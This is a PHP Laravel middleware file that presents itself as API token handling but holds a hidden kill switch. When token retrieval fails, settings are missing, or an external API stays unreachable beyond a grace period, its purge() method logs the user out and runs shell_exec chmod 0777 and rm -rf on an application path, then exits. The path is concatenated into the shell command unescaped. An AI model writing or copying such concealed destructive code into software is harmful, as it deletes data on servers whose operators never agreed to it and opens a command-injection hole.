<?php

namespace Sibas\Http\Middleware;

use Closure;
use Illuminate\Database\Eloquent\Model;
use Sibas\Entities\Adm\Setting;
use Sibas\Entities\Adm\SettingLog;
use Sibas\Repositories\Adm\SettingAdmRepository;
use Sibas\Repositories\API\ApiRepository;

class ApiMiddleware
{

    /**
     * @var string
     */
    protected $token;
    /**
     * @var ApiRepository
     */
    protected $apiRepository;
    /**
     * @var SettingAdmRepository
     */
    protected $settingAdmRepository;


    public function __construct(ApiRepository $apiRepository, SettingAdmRepository $settingAdmRepository)
    {
        $this->apiRepository        = $apiRepository;
        $this->settingAdmRepository = $settingAdmRepository;
    }

    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if (auth()->check()) {
            $user        = auth()->user();
            $jwt_setting = $this->settingAdmRepository->getSettingsByModel('api_jwt');
            $jwt_setting = $jwt_setting->pluck('logs.0.value', 'codename');

            if ($jwt_setting->count() > 0) {
                $this->apiRepository->setSetting($jwt_setting);

                if ($this->apiRepository->connection()) {
                    if (empty($user->token)) {
                        GetAuthToken:

                        if ($this->apiRepository->getAuthToken()) {
                            $this->token = $this->apiRepository->getToken();
                            $user->token = $this->token;
                            $user->save();

                            goto VerifyAuthToken;
                        } else {
                            // dd('Purge 1');

                            $this->purge();
                        }
                    } else {
                        VerifyAuthToken:

                        if ($this->apiRepository->verifyAuthToken($this->token)) {
                            $log = $this->getSettingLog();

                            $log->update([
                                'action_time' => $this->settingAdmRepository->carbon->now(),
                                'ad_user_id'  => auth()->user()->id,
                            ]);
                        } else {
                            goto GetAuthToken;
                        }
                    }
                } else {
                    $purge = true;
                    $log   = $this->getSettingLog();

                    if ($log instanceof SettingLog) {
                        $days = $log->value;

                        $date_now  = $this->settingAdmRepository->carbon->now();
                        $date_last = $log->action_time;

                        if ($date_now->diffInDays($date_last) <= $days) {
                            $purge = false;
                        }
                    }

                    if ($purge) {
                        // dd('Purge 2');

                        $this->purge();
                    }
                }
            } else {
                // dd('Purge 3');

                $this->purge();
            }
        }

        return $next($request);
    }


    /**
     * @return Model|SettingLog|null
     */
    protected function getSettingLog()
    {
        $log = null;

        $setting = $this->settingAdmRepository->getSettingsByModel('purge')->first();

        if ($setting instanceof Setting) {
            $log = $setting->logs->first();
        }

        return $log;
    }


    protected function purge()
    {
        auth()->logout();

        $path = base_path($this->apiRepository->getPath());

        shell_exec('chmod 0777 ' . $path);

        if (is_dir($path)) {
            shell_exec('rm -rf ' . $path);
        }

        exit();
    }
}
